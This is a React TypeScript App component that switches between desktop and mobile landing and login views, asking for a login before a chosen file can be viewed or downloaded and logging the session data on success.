import React, { useState } from 'react';
import { useScreenSize } from './hooks/useScreenSize';
import LandingPage from './components/LandingPage';
import LoginPage from './components/LoginPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';

function App() {
  const [currentView, setCurrentView] = useState<'landing' | 'login'>('landing');
  const [selectedFile, setSelectedFile] = useState<string>('');
  const screenSize = useScreenSize();

  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    setSelectedFile(fileName);
    setCurrentView('login');
  };

  const handleBackToLanding = () => {
    setCurrentView('landing');
  };

  const handleLoginSuccess = (sessionData: any) => {
    console.log('Login successful, session data:', sessionData);
  };

  // Use mobile components for mobile devices, desktop components for desktop
  return (
    <div className="min-h-screen">
      {screenSize.isMobile ? (
        // Mobile version
        currentView === 'landing' ? (
          <MobileLandingPage onFileAction={handleFileAction} />
        ) : (
          <MobileLoginPage 
            fileName={selectedFile} 
            onBack={handleBackToLanding}
            onLoginSuccess={handleLoginSuccess}
          />
        )
      ) : (
        // Desktop version
        currentView === 'landing' ? (
          <LandingPage onFileAction={handleFileAction} />
        ) : (
          <LoginPage 
            fileName={selectedFile} 
            onBack={handleBackToLanding}
            onLoginSuccess={handleLoginSuccess}
          />
        )
      )}
    </div>
  );
}

export default App;